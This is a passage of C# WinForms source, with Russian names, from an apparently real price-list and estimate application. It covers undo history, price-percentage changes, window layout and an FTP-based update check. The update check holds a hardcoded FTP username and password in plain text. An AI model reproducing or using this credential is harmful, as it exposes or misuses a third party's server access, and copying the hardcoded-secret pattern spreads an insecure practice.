        DataGridView[] clone1 = new DataGridView[1];
        string[] примечание = new string[1];
        bool не_надо_сохранять = false;

        //сохраняем данные в потоке
        private void событие_потока_истории()
        {
            //данные расчетки начало 
            //  //добавим в массив

          //  try { label_consol_2.Invoke((MethodInvoker)delegate { label_consol_2.Text = "запуск сохранения"; }); } catch { }
            clone1 = clone1.Concat(new DataGridView[] { new DataGridView() }).ToArray();// new DataGridView();
            clone2 = clone2.Concat(new DataGridView[] { new DataGridView() }).ToArray();// new DataGridView();     
            примечание = примечание.Concat(new string[] { "" }).ToArray();
            clone2[clone2.Length - 1].Rows.Clear();
            var column0 = new DataGridViewTextBoxColumn();
            var column1 = new DataGridViewCheckBoxColumn();
            var column2 = new DataGridViewTextBoxColumn();
            var column3 = new DataGridViewCheckBoxColumn();
            var column4 = new DataGridViewTextBoxColumn();
            var column5 = new DataGridViewCheckBoxColumn();
            var column6 = new DataGridViewCheckBoxColumn();
            var column7 = new DataGridViewCheckBoxColumn();
            var column8 = new DataGridViewCheckBoxColumn();
            var column9 = new DataGridViewCheckBoxColumn();
            var column10 = new DataGridViewCheckBoxColumn();
            try { this.clone2[clone2.Length - 1].Columns.AddRange(new DataGridViewColumn[] { column1, column2, column3, column4, column5, column6, column7, column8, column9, column10 }); } catch { }
            for (int i = 0; i <= dataGridView_расчёт_2.NewRowIndex; i++)
            {              
                if (i < dataGridView_расчёт_2.NewRowIndex)
                {
                    try { clone2[clone2.Length - 1].Rows.Add(); } catch { }
                    for (int h = 0; h < 11; h++)
                    {
                        try { clone2[clone2.Length - 1].Rows[i].Cells[h].Value = dataGridView_расчёт_2.Rows[i].Cells[h].Value; } catch { }//данные
                        try { clone2[clone2.Length - 1][h, i].Style.BackColor = dataGridView_расчёт_2[h, i].Style.BackColor; } catch { }//цвета
                    }
                }
                if (i == dataGridView_расчёт_2.NewRowIndex)
                {
                    for (int h = 0; h < 11; h++)
                    {
                        try { clone2[clone2.Length - 1].Rows[clone2[clone2.Length - 1].NewRowIndex].Cells[h].Value = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[h].Value; } catch { }
                        try { clone2[clone2.Length - 1][h, clone2[clone2.Length - 1].NewRowIndex].Style.BackColor = dataGridView_расчёт_2[h, clone2[clone2.Length - 1].NewRowIndex].Style.BackColor; } catch { }
                    }
                }
            }
            // данные расчетки расчетки конец
            //данные завичимостей начало
            if (dataGridView_зависимость.Rows.Count > 0) //проверить на отсутствие
            {
                try
                {
                    clone1[clone1.Length - 1].Rows.Clear();
                    var colum0 = new DataGridViewTextBoxColumn();
                    var colum1 = new DataGridViewCheckBoxColumn();
                    var colum2 = new DataGridViewTextBoxColumn();
                    var colum3 = new DataGridViewCheckBoxColumn();
                    var colum4 = new DataGridViewTextBoxColumn();
                    var colum5 = new DataGridViewTextBoxColumn();
                    this.clone1[clone1.Length - 1].Columns.AddRange(new DataGridViewColumn[] { colum0, colum1, colum2, colum3, colum4, colum5 });
                    for (int i = 0; i < dataGridView_зависимость.Rows.Count - 1; i++)
                    {
                        //данные
                        clone1[clone1.Length - 1].Rows.Add(dataGridView_зависимость.Rows[i].Cells[0].Value, dataGridView_зависимость.Rows[i].Cells[1].Value, dataGridView_зависимость.Rows[i].Cells[2].Value, dataGridView_зависимость.Rows[i].Cells[3].Value, dataGridView_зависимость.Rows[i].Cells[4].Value, dataGridView_зависимость.Rows[i].Cells[5].Value);
                    }
                }
                catch { }
            }
            //данные зависимостей конец
            //примечание копируем 
            примечание[примечание.Length - 1] = textBox_P_S.Text;
            //удаляем первую в массиве
            if (clone1.Length > 5)
            {
                clone1 = clone1.Where((val, idx) => idx != 0).ToArray();//удалим первый в массиве
                clone2 = clone2.Where((val, idx) => idx != 0).ToArray();//удалим первый в массиве
                примечание = примечание.Where((val, idx) => idx != 0).ToArray();//удалим первый в массиве
            }

            //если была нажата кнопка удалить строку в  расчётке то после сохранения запускам процес удаления
            if (del_razhet_sobyt == true)
            { try { label_consol_2.Invoke((MethodInvoker)delegate { del_razhet(); }); } catch { } }
            //если была нажата кнопка удалить последнюю строку в  расчётке то после сохранения запускам процес удаления
            if(button_del_razhet_sobit == true)
            try { label_consol_2.Invoke((MethodInvoker)delegate { button_del_razhet_funktia(); }); } catch { }




            //
            поток_истории.Abort();            
        }

        //сохраняем в "назад" любые изменения ячееках (не добавить, разделы и события!)
        private void dataGridView_расчёт_2_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
        {
            сохранить_для_востоновления();

        }

        // изменить цену на какой-то процент на определенного производителя      
        System.Windows.Forms.TextBox texp = new System.Windows.Forms.TextBox(); //имя производителя
        System.Windows.Forms.TextBox texk = new System.Windows.Forms.TextBox();  //процент 

        private void изменитьНаЦенуПроизводителяToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (Baza == true) { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }




            //Создадим окно ввода
            Form dah = new Form();
            dah.Name = "Ввод данных";
            dah.StartPosition = FormStartPosition.CenterScreen;
            int k = 200;
            dah.Width = k;
            dah.Height = k;
            dah.MinimumSize = new Size(k, k);
            dah.MaximumSize = new Size(k, k);
            dah.TopMost = true;   //FORMSTYLE:=FSSTAYONTOP
            dah.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");
            dah.MaximizeBox = false;
            dah.ShowInTaskbar = false;


            System.Windows.Forms.Button but = new System.Windows.Forms.Button(); // 
            but.Text = "Применить";
            but.Size = new Size(150, 30);
            but.Location = new System.Drawing.Point(16, 120);
            but.Click += new System.EventHandler(this.buh_процент_цены);
            dah.Controls.Add(but);

            texp.Size = new Size(150, 30);
            texp.Location = new System.Drawing.Point(16, 35);
            dah.Controls.Add(texp);
            texk.Size = new Size(150, 30);
            texk.Location = new System.Drawing.Point(16, 90);
            dah.Controls.Add(texk);
            System.Windows.Forms.Label l1 = new System.Windows.Forms.Label();
            l1.Text = "Имя производителя:";
            l1.Size = new Size(180, 19);
            l1.Location = new System.Drawing.Point(16, 10);
            l1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            dah.Controls.Add(l1);
            System.Windows.Forms.Label l2 = new System.Windows.Forms.Label();
            l2.Text = "Цену изменить на %:";
            l2.Size = new Size(180, 19);
            l2.Location = new System.Drawing.Point(16, 61);
            l2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            dah.Controls.Add(l2);
            dah.ShowDialog(); ;
        }

        private void buh_процент_цены(object sender, EventArgs e)
        {
            decimal newDecimal22;
            bool isDecimal22 = Decimal.TryParse(texk.Text.Replace(".", ","), out newDecimal22);
            if (isDecimal22 == true)
            {
                for (int x = 0; x < tableDataGridView.Rows.Count - 1; x++)
                {
                    String vvv = "";
                    vvv = tableDataGridView.Rows[x].Cells[1].Value.ToString();

                    if (vvv == texp.Text)
                    {
                        String gg = tableDataGridView.Rows[x].Cells[5].Value.ToString();
                        decimal newDecimalc;
                        bool isDecimal = Decimal.TryParse(gg, out newDecimalc);
                        if (isDecimal == true)
                        {      // ИТОГ  = (("число в прайсе"/100 ) Х "число в окне")+"число в прайсе"
                            decimal newDecimal11 = ((newDecimalc / 100) * newDecimal22) + newDecimalc;
                            tableDataGridView.CurrentCell = tableDataGridView.Rows[x].Cells[1];
                            tableDataGridView.Rows[x].Cells[5].Value = newDecimal11.ToString("########.0000");
                        }
                    }
                }
                MessageBox.Show(texp.Text + " изменён на:" + newDecimal22.ToString("########.0000") + "%", "Сообщение", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else { MessageBox.Show("Не корректный %", "Ошибка орфографии", MessageBoxButtons.OK, MessageBoxIcon.Error); }
        }


        //цвет в pdf
        Form colorPDF;
        public bool gt1 = false;
        private void button6_Click(object sender, EventArgs e)
        {
            if (gt1 == false)
            {
                colorPDF = new Kolor_PDF();
                colorPDF.Show();
                gt1 = true;
            }
            else
            {
                colorPDF.Activate();
            }

        }
        #region изменение окна программы 
        private void Form1_SizeChanged(object sender, EventArgs e)
        {
            button_Baza_RACHET.Width = Width - 20;
            groupBox_baza.Width = Width - 20;
            groupBox_razhet.Width = Width - 20;
            tableDataGridView.Width = Width - 30;
            dataGridView_расчёт_2.Width = Width - 30;
            textBox_P_S.Width = Width - 75;
            label_consol.Location = new System.Drawing.Point(15, Height - 107);
            groupBox_baza.Height = Height - 89;
            tableDataGridView.Height = Height - 243;
            label_consol_2.Location = new System.Drawing.Point(15, Height - 105);
            groupBox_razhet.Location = new System.Drawing.Point(2, 48);
            groupBox_razhet.Height = Height - 88;
            dataGridView_расчёт_2.Height = Height - 310;     //  
            textBox_P_S.Location = new System.Drawing.Point(37, Height - 125);
            groupBox_поиск.Size = new Size(this.Width - groupBox_поиск.Location.X - 25, groupBox_поиск.Size.Height);
            button_загрузить_изображение.Location = new System.Drawing.Point(this.Size.Width - 162, button_загрузить_изображение.Location.Y);
            button1.Location = new System.Drawing.Point(this.Size.Width - 162, button1.Location.Y);
            groupBox1.Location = new System.Drawing.Point(this.Size.Width - 132, groupBox1.Location.Y);
            pictureBox_no_image.Location = new System.Drawing.Point(this.Size.Width - 295, pictureBox_no_image.Location.Y);
            фотографияPictureBox.Location = new System.Drawing.Point(this.Size.Width - 295, фотографияPictureBox.Location.Y);
            int ih = this.Size.Width / 2;
            производительLabel.Location = new System.Drawing.Point(ih + 0, производительLabel.Location.Y);
            наименованиеLabel.Location = new System.Drawing.Point(ih + 3, наименованиеLabel.Location.Y);
            артикулLabel.Location = new System.Drawing.Point(ih + 38, артикулLabel.Location.Y);
            ценаLabel.Location = new System.Drawing.Point(ih + 52, ценаLabel.Location.Y);
            производительTextBox.Location = new System.Drawing.Point(ih + 92, производительTextBox.Location.Y);
            наименованиеTextBox.Location = new System.Drawing.Point(ih + 92, наименованиеTextBox.Location.Y);
            артикулTextBox.Location = new System.Drawing.Point(ih + 92, артикулTextBox.Location.Y);
            ценаTextBox.Location = new System.Drawing.Point(ih + 92, ценаTextBox.Location.Y);
            производительTextBox.Size = new Size(pictureBox_no_image.Location.X - производительTextBox.Location.X - 4, производительTextBox.Size.Height);
            наименованиеTextBox.Size = new Size(pictureBox_no_image.Location.X - наименованиеTextBox.Location.X - 4, наименованиеTextBox.Size.Height);
            артикулTextBox.Size = new Size(pictureBox_no_image.Location.X - артикулTextBox.Location.X - 4, артикулTextBox.Size.Height);
            ценаTextBox.Size = new Size(pictureBox_no_image.Location.X - ценаTextBox.Location.X - 4, ценаTextBox.Size.Height);
            comboBox1_поиск.Size = new Size(ih - comboBox1_поиск.Location.X - 2, comboBox1_поиск.Size.Height);
            comboBox1_поиск.Focus();
            comboBox_наименование_поиск_по_базе.Size = new Size(ih - comboBox_наименование_поиск_по_базе.Location.X - 2, comboBox_наименование_поиск_по_базе.Size.Height);
            comboBox_наименование_поиск_по_базе.Focus();
            label7.Location = new System.Drawing.Point(ih - 276, label7.Location.Y);
            comboBox_цена_поиск_по_базе.Location = new System.Drawing.Point(ih - 240, comboBox_цена_поиск_по_базе.Location.Y);
            label12.Location = new System.Drawing.Point(ih - 134, label12.Location.Y);
            numericUpDown3.Location = new System.Drawing.Point(ih - 65, numericUpDown3.Location.Y);
            comboBox_артикул_поиск_по_базе.Size = new Size(ih - comboBox_артикул_поиск_по_базе.Location.X - 280, comboBox_артикул_поиск_по_базе.Size.Height);
            comboBox_артикул_поиск_по_базе.Focus();

            //окно работы с сеткой

            if (open_okno == true && Baza == false) groupBox_url_praise.Location = new System.Drawing.Point(366, groupBox_url_praise.Location.Y);
            if (open_okno == false&& Baza == false){groupBox_url_praise.Location = new System.Drawing.Point(this.Size.Width + 1, groupBox_url_praise.Location.Y);}
            if (Baza == true) groupBox_url_praise.Location = new System.Drawing.Point(this.Size.Width + 1, groupBox_url_praise.Location.Y);


            //чатик
            chat_pos();

            if (this.Width < 1120)
            {

                this.groupBox_добавить.Size = new Size(this.Width - groupBox_добавить.Location.X - 28, groupBox_добавить.Size.Height);
                button_new_foto.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 163, button_new_foto.Location.Y);
                button_new_foto_down.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 109, button_new_foto_down.Location.Y);
                button_del_new_image.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 130, button_del_new_image.Location.Y);
                //958   - 130
                pictureBox_new_image.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 276, pictureBox_new_image.Location.Y);
                pictureBox_no_image_добавить_в_прайс.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 274, pictureBox_no_image_добавить_в_прайс.Location.Y);
                label14.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 320, label14.Location.Y);
                label4.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 344, label4.Location.Y);
                numericUpDown1.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 346, numericUpDown1.Location.Y);
                //185; 20
                int k = (1120 - this.Width) / 2;
                textBox_new_артикул.Size = new Size(185 - k, textBox_new_артикул.Size.Height);
                textBox_new_артикул.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 537 + k, textBox_new_артикул.Location.Y);
                label3.Location = new System.Drawing.Point(this.groupBox_добавить.Size.Width + this.groupBox_добавить.Location.X - 533 + k, label3.Location.Y);
                textBox_new_наименование.Size = new Size(textBox_new_артикул.Location.X - textBox_new_наименование.Location.X - 4, textBox_new_наименование.Size.Height);
                button_добавить_значение_в_табл.Size = new Size(729 - (1039 - groupBox_добавить.Size.Width), button_добавить_значение_в_табл.Size.Height);
            }

            else
            {
                this.groupBox_добавить.Size = new Size(1039, groupBox_добавить.Size.Height);
                button_new_foto.Location = new System.Drawing.Point(930, button_new_foto.Location.Y);
                button_new_foto_down.Location = new System.Drawing.Point(984, button_new_foto_down.Location.Y);
                button_del_new_image.Location = new System.Drawing.Point(958, button_del_new_image.Location.Y);
                pictureBox_new_image.Location = new System.Drawing.Point(812, pictureBox_new_image.Location.Y);
                pictureBox_no_image_добавить_в_прайс.Location = new System.Drawing.Point(815, pictureBox_no_image_добавить_в_прайс.Location.Y);
                label14.Location = new System.Drawing.Point(768, label14.Location.Y);
                label4.Location = new System.Drawing.Point(744, label4.Location.Y);
                numericUpDown1.Location = new System.Drawing.Point(742, numericUpDown1.Location.Y);
                textBox_new_артикул.Location = new System.Drawing.Point(551, textBox_new_артикул.Location.Y);
                button_добавить_значение_в_табл.Size = new Size(729, button_добавить_значение_в_табл.Size.Height);
                textBox_new_артикул.Size = new Size(185, textBox_new_артикул.Size.Height);
                label3.Location = new System.Drawing.Point(555, label3.Location.Y);
                textBox_new_наименование.Size = new Size(348, textBox_new_наименование.Size.Height);
            }

            if (this.Width < 1080)
            {
                button_поиск_по_баз_замен.Size = new Size(129, button_поиск_по_баз_замен.Size.Height);
            }
            else
                button_поиск_по_баз_замен.Size = new Size(160, button_поиск_по_баз_замен.Size.Height);




            //в расчёте 
            if (this.Width < 1156)
            {
                groupBox4.Location = new System.Drawing.Point(755 - (1156 - this.Width), groupBox4.Location.Y);
                groupBox6.Location = new System.Drawing.Point(755 - (1156 - this.Width), groupBox6.Location.Y);
            }
            else
            {
                groupBox4.Location = new System.Drawing.Point(755, groupBox4.Location.Y);
                groupBox6.Location = new System.Drawing.Point(755, groupBox6.Location.Y);
            }




            if (this.Width > 1740)
            {
                dataGridView_зависимость.Location = new System.Drawing.Point(1155, dataGridView_зависимость.Location.Y);
                Column33.Width = 60;
                Column35.Width = 60;
                Примечание.Width = 150;
            }
            else
            {
                dataGridView_зависимость.Location = new System.Drawing.Point(2000, dataGridView_зависимость.Location.Y);
                Column33.Width = 2;
                Column35.Width = 2;
                if (this.Width < 1070)
                { Примечание.Width = 85; }
                else
                { Примечание.Width = 130; }

            }




            if (this.Width < 1108)
            {
                groupBox_Расчеты.Location = new System.Drawing.Point(490 - (1108 - this.Width), groupBox_Расчеты.Location.Y);


                groupBox_картинка_расчетки.Location = new System.Drawing.Point(644 - (1108 - this.Width), groupBox_картинка_расчетки.Location.Y);
                button_расчет_фото_из_буфера.Location = new System.Drawing.Point(677 - (1108 - this.Width), button_расчет_фото_из_буфера.Location.Y);
                button_расчет_фото_доб.Location = new System.Drawing.Point(677 - (1108 - this.Width), button_расчет_фото_доб.Location.Y);
                pictureBox_Raz.Location = new System.Drawing.Point(518 - (1108 - this.Width), pictureBox_Raz.Location.Y);
                groupBox7.Location = new System.Drawing.Point(485 - (1108 - this.Width), groupBox7.Location.Y);
                dataGridView_муляж.Size = new Size(478 - (1108 - this.Width), dataGridView_муляж.Size.Height);
                dataGridViewTextBoxColumn7.Width = 270 - (1108 - this.Width);

            }
            else
            {
                groupBox_Расчеты.Location = new System.Drawing.Point(490, groupBox_Расчеты.Location.Y);
                groupBox_картинка_расчетки.Location = new System.Drawing.Point(644, groupBox_картинка_расчетки.Location.Y);
                button_расчет_фото_из_буфера.Location = new System.Drawing.Point(677, button_расчет_фото_из_буфера.Location.Y);
                button_расчет_фото_доб.Location = new System.Drawing.Point(677, button_расчет_фото_доб.Location.Y);
                pictureBox_Raz.Location = new System.Drawing.Point(518, pictureBox_Raz.Location.Y);
                groupBox7.Location = new System.Drawing.Point(485, groupBox7.Location.Y);
                dataGridView_муляж.Size = new Size(478, dataGridView_муляж.Size.Height);
                dataGridViewTextBoxColumn7.Width = 270;


            }

        }






        #endregion изменение окна программы 

        System.Windows.Forms.Timer timerr = new System.Windows.Forms.Timer();



        //Бегущая строка требуется расчёт 
        private void razhet_label_VisibleChanged(object sender, EventArgs e)
        {
            if (razhet_label.Visible == true && timerr.Enabled == false)
            {
                timerr.Start();
            }
            else
            {
                timerr.Stop();
            }
        }

        private void timerrr_Tick(object sender, EventArgs e)
        {
            if (razhet_label.Left > -200 && razhet_label.Left > 100)
            {
                razhet_label.Left -= 5;
            }
            else
            {
                razhet_label.Left = 200;
                razhet_label.Text = "Требуется расчёт!";
            }
        }

        bool no_color_w = false;
        private void button7_Click(object sender, EventArgs e)
        {
            if (dataGridView_расчёт_2.NewRowIndex < 1)
            {
                label_consol_2.Text = "Расчётка пустая! Не-а.";
            }
            else
            {
                была_нажата_расёт_и_цена_или_просто_расёт = true;
                button_взять_актуальные_цены_с_базы.PerformClick();
                no_color_w = true;
                button_расчитать.PerformClick();
                была_нажата_расёт_и_цена_или_просто_расёт = true;
            }
            /*
             * //ВЕСЬ ТЕКСт в буфер
            var newline = System.Environment.NewLine;
            var tab = "\t";
            var clipboard_string="" ;
            foreach (DataGridViewRow row in dataGridView_расчёт_2.Rows)
            {
                for (int i = 0; i < row.Cells.Count; i++)
                {
                    if (i == (row.Cells.Count - 1))
                        clipboard_string += row.Cells[i].Value + newline;
                    else
                        clipboard_string += row.Cells[i].Value + tab;
                }
            }
            Clipboard.SetDataObject(clipboard_string);
           */
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            button_new_ophins2.PerformClick();
        }

        private void сохранить_для_востоновления()
        {
            if (не_надо_сохранять == false)
            {
                поток_истории = new Thread(событие_потока_истории);
                // поток_истории = new Thread(() => событие_потока_истории()); //создаем поток
                поток_истории.Start(); //запускам поток. \
            }
        }


        #region проверка обновление в сети

        Thread myThread;
        bool nyna_update = false;
        private void timer_auto_update_Tick(object sender, EventArgs e)
        {
            timer_auto_update.Enabled = false;
            myThread = new Thread(() => Проверка_обновления());
            myThread.Start();
        }
        void Проверка_обновления()
        {
        
            
            DateTime new_soft = new DateTime();
            DateTime tec_soft = new DateTime();
            // Создаем объект FtpWebRequest
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(new Uri(url_praise +"/setup_auto"));
            request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            request.Method = WebRequestMethods.Ftp.GetDateTimestamp;
            // получаем ответ от сервера в виде объекта FtpWebResponse
            FtpWebResponse response = null;
            try { response = (FtpWebResponse)request.GetResponse(); }
            catch
            {               
                
                myThread.Abort();
            }

            new_soft = new DateTime(response.LastModified.Year, response.LastModified.Month, response.LastModified.Day, response.LastModified.Hour, response.LastModified.Minute, response.LastModified.Second); // год - месяц - день - час - минута - секунда
            response.Close();

            
                //Ну раз есть значит надо проверить нашу версию программы.
             //   new_soft = file.LastWriteTime;

                string exe_name = System.IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath);
                string exe_name_p = System.Windows.Forms.Application.ExecutablePath;

                FileInfo fileInfo2 = new FileInfo(exe_name_p);
                tec_soft = fileInfo2.LastWriteTime;


                if (tec_soft < new_soft) //временно < Да .. Можно обновиться. 
                {
                    DialogResult res = MessageBox.Show("---Ура! Вышло обновление!---\nНе желаете обновить программу?", "Радостная новость", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
                    if (res == DialogResult.Cancel) { myThread.Abort(); }
                    if (res == DialogResult.OK)
                    {
                        try { this.Invoke((MethodInvoker)delegate { nyna_update = true; }); } catch { }
                        try { this.Invoke((MethodInvoker)delegate { Close(); }); } catch { }
                    }
                }
            
            myThread.Abort();
        }




        #endregion проверка обновление в сети

        //Кнопка  НАЗАД востанавливаем данные
        private void пробник2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            не_надо_сохранять = true;
            //запомним положение маркира. Если актуально.
            int[] текущее_положение_ячейки = new int[2];
            try
            {
                текущее_положение_ячейки[0] = dataGridView_расчёт_2.CurrentCell.RowIndex;
                текущее_положение_ячейки[1] = dataGridView_расчёт_2.CurrentCell.ColumnIndex;
            }
            catch { }


            //1) надо проверить а есть ли что востонавливать 


            if (clone1.Length > 1 && clone1[clone1.Length - 1] != null)
            {
                int k = (clone1.Length - 1);
                try
                {
                    int ewfew = clone2[k].NewRowIndex;
                    // данные расчетки начало 
                    dataGridView_расчёт_2.Rows.Clear();

                    for (int i = 0; i <= clone2[k].NewRowIndex; i++)
                    {
                        if (i < clone2[k].NewRowIndex)
                        {
                            //данные
                            dataGridView_расчёт_2.Rows.Add("");
                            for (int v = 0; v < 11; v++)
                            {
                                try { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[v].Value = clone2[k].Rows[i].Cells[v].Value; } catch { }
                            }
                            //цвета
                            for (int h = 0; h < 11; h++)
                            {
                                try { dataGridView_расчёт_2[h, i].Style.BackColor = clone2[k][h, i].Style.BackColor; } catch { }
                            }
                        }
                        if (i == clone2[k].NewRowIndex)
                        {
                            for (int h = 0; h < 11; h++)
                            {
                                try { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[h].Value = clone2[k].Rows[clone2[k].NewRowIndex].Cells[h].Value; } catch { }
                                try { dataGridView_расчёт_2[h, dataGridView_расчёт_2.NewRowIndex].Style.BackColor = clone2[k][h, clone2[k].NewRowIndex].Style.BackColor; } catch { }
                            }
                        }
                    }
                    // данные расчетки конец

                    //данные завивимостей начало
                    dataGridView_зависимость.Rows.Clear();
                    for (int i = 0; i <= clone1[k].NewRowIndex; i++)
                    {
                        dataGridView_зависимость.Rows.Add("");
                        for (int h = 0; h < 6; h++)
                        {
                            try { dataGridView_зависимость.Rows[i].Cells[h].Value = clone1[k].Rows[i].Cells[h].Value; } catch { }
                        }
                    }
                    //данные зависимостей конец

                    //примечание копируем 
                    textBox_P_S.Text = примечание[k];
                    label_consol_2.Text = "Востановленно...";
                    //теперь надо удалить последнюю строку. и добавить первую

                    //удаляем 
                    clone1 = clone1.Where((val, idx) => idx != clone1.Length - 1).ToArray();//удалим последнюю в массиве
                    clone2 = clone2.Where((val, idx) => idx != clone2.Length - 1).ToArray();//удалим последюю в массиве
                    примечание = примечание.Where((val, idx) => idx != примечание.Length - 1).ToArray();//удалим последнюю в массиве                    
                }
                catch
                {
                    label_consol_2.Text = "Это фиско, братан!";
                }
            }
            else
            {
                label_consol_2.Text = "Больше низя отмотать, сори";
            }
            try { dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[текущее_положение_ячейки[0]].Cells[текущее_положение_ячейки[1]]; } catch { } //вернем положения юзера на интересную ему кнопку
            не_надо_сохранять = false;
        }
        #endregion кнопка отмена 



        //функция проверки файла на наличае
        protected virtual bool IsFileLocked(FileInfo file)
        {
            FileStream stream = null;

            try
            {
                stream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None);
            }
            catch (IOException)
            {
                //the file is unavailable because it is:
                //still being written to
                //or being processed by another thread
                //or does not exist (has already been processed)
                return true;
            }
            finally
            {
                if (stream != null)
                    stream.Close();
            }

            //file is not locked
            return false;
        }


        //Настройки//параметры//конфигурация
        private void настройкиToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Form par = new Параметры();
            par.TopMost = true;
            par.Show();

          
        }

        #region C или без фото в ексель
        bool no_image = false;
        private void button_no_image_for_excel_Click(object sender, EventArgs e)
        {
            //фото в ексель иконка с и без фото          
            string[] setting_excel = new string[15];
            int r = 0;
            using (StreamReader stream = new StreamReader("rez\\Color_excel.txt"))
            {
                while (stream.Peek() >= 0)
                {
                    setting_excel[r] = stream.ReadLine();
                    r++;
                }
                stream.Close();
            }
            if (setting_excel[6] == "1") { button_no_image_for_excel.BackgroundImage = Properties.Resources.с_фото; setting_excel[6] = "0"; } else { button_no_image_for_excel.BackgroundImage = Properties.Resources.без_фото; setting_excel[6] = "1"; }
            //сохранение в exsel вывод расётки
            using (StreamWriter sw = new StreamWriter("rez\\Color_excel.txt", false, System.Text.Encoding.UTF8))
            {
                sw.WriteLine(setting_excel[0]);
                sw.WriteLine(setting_excel[1]);
                sw.WriteLine(setting_excel[2]);
                sw.WriteLine(setting_excel[3]);
                sw.WriteLine(setting_excel[4]);
                sw.WriteLine(setting_excel[5]);
                sw.WriteLine(setting_excel[6]);
                sw.WriteLine(setting_excel[7]);
                sw.WriteLine(setting_excel[8]);
                sw.WriteLine(setting_excel[9]);
                sw.WriteLine(setting_excel[10]);
                sw.WriteLine(setting_excel[11]);
                sw.WriteLine(setting_excel[12]);
                sw.WriteLine(setting_excel[13]);
                sw.WriteLine(setting_excel[14]);
            }
        }
        public void foto_excel_button(bool f)
            {
            if (f == true) { button_no_image_for_excel.BackgroundImage = Properties.Resources.без_фото; } else { button_no_image_for_excel.BackgroundImage = Properties.Resources.с_фото; }
            }


        #endregion C или без фото в ексель
        public void oposity(double f)
        {
            this.Opacity = f;
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {            
            searh.StartPosition = FormStartPosition.CenterScreen;
            searh.BackColor = Color.LightGray;
            searh.Size = new Size(230, 150);
            searh.Text = "Поиск";
            searh.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");
            searh.MaximizeBox = false;
            searh.MinimizeBox = false;
            searh.MinimumSize = new Size(230, 150);
            searh.MaximumSize = new Size(230, 150);
            searh.FormBorderStyle = FormBorderStyle.SizableToolWindow;
            searh.KeyPreview = true;
            System.Windows.Forms.Label laba = new System.Windows.Forms.Label();
            laba.Location = new System.Drawing.Point(5, 5);
            laba.Size = new Size(150, 13);
            if (Baza == false) laba.Text = "Поиск внутри прайса:"; else laba.Text = "Поиск внутри расчётки:";
            check_dalee.Location = new System.Drawing.Point(5, 22);
            check_dalee.Size = new Size(200, 15);
            check_dalee.Text = "Искать ниже с выделеной ячейки";
            searh_text.Location = new System.Drawing.Point(5, 41);
            searh_text.Size = new Size(200, 20);
            searh_button.Location = new System.Drawing.Point(5, 68);
            searh_button.Text = "поиск";
            searh_button.Size = new Size(150, 25);
            searh.Controls.Add(laba);
            searh.Controls.Add(check_dalee);
            searh.Controls.Add(searh_text);
            searh.Controls.Add(searh_button);
            searh.ActiveControl = searh_text;
            if (tableDataGridView.Rows.Count > 0 && Baza == false) searh.ShowDialog(); else { MessageBox.Show("пустая таблица", ""); }            
            if (Baza == false) { baza_searh_position[0] = 0; baza_searh_position[1] = 0; } else { praise_searh_position[0] = 0; praise_searh_position[1] = 0; }
        }


#region чат  chat
        //чат
        bool chat_open = false;
        string name_chate = "/messenger/chat2.txt";
        int длина_чата = 90;
        private void button_asq_Click(object sender, EventArgs e)
        {
            if (chat_open == false) { chat_open = true; } else { chat_open = false; }
            if (звук_сообщения == false) { звук_сообщения = true;

                //Аська.BackColor = Color.Green;
            }
            else
            { звук_сообщения = false; // Аська.BackColor = Color.Empty;
            }
            chat_pos();
            button_asq.BackColor =Color.PeachPuff;
        }
        private void chat_pos()
        {
            int pos_visoti=0;
           if (this.Size.Height > 585)
                    pos_visoti = 208;
                else
                    pos_visoti = 208 - (585- this.Size.Height) ;
            if (chat_open == false)
            {                    
                button_asq.Location = new System.Drawing.Point(this.Size.Width - 38, pos_visoti);
                groupBox_asq.Location = new System.Drawing.Point(this.Size.Width, pos_visoti);
            }
            else
            {
                button_asq.Location = new System.Drawing.Point(this.Size.Width - 426, pos_visoti);
                groupBox_asq.Location = new System.Drawing.Point(this.Size.Width - 413, pos_visoti);

            }
        }
        Thread messenger;
        Thread messenger_update;
        Thread messenger_download;
        DateTime new_mess = new DateTime();
        DateTime tec_soft = new DateTime();
        bool update_mess = false;
        string[] messenges;
        bool new_mess_ride = true;
        bool звук_сообщения = false;
        bool надо_звук_сообщения = true;
        private void  chat_Load()
        {
            messenges = new string[длина_чата];
            dataGridView1.RowHeadersVisible = false;
